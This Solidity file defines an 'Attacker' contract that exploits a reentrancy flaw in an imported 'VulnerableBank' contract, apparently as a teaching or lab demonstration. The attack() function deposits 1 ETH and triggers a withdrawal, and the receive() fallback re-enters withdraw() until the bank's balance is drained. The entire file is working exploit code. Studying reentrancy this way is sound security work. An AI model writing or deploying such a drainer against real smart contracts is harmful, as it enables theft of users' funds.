// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;
    uint256 public attackCount;

    constructor(address _bankAddress) {
        vulnerableBank = VulnerableBank(_bankAddress);
    }

    // step 1: deposit then trigger withdrawal
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw();
    }

    // // Re-enter the vulnerable contract until all available Ether is drained
    receive() external payable {
    uint256 contractBalance = address(vulnerableBank).balance;
    uint256 myRecordedBalance = vulnerableBank.balances(address(this));

    if (contractBalance > 0 && myRecordedBalance > 0) {
        vulnerableBank.withdraw();
    }
}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}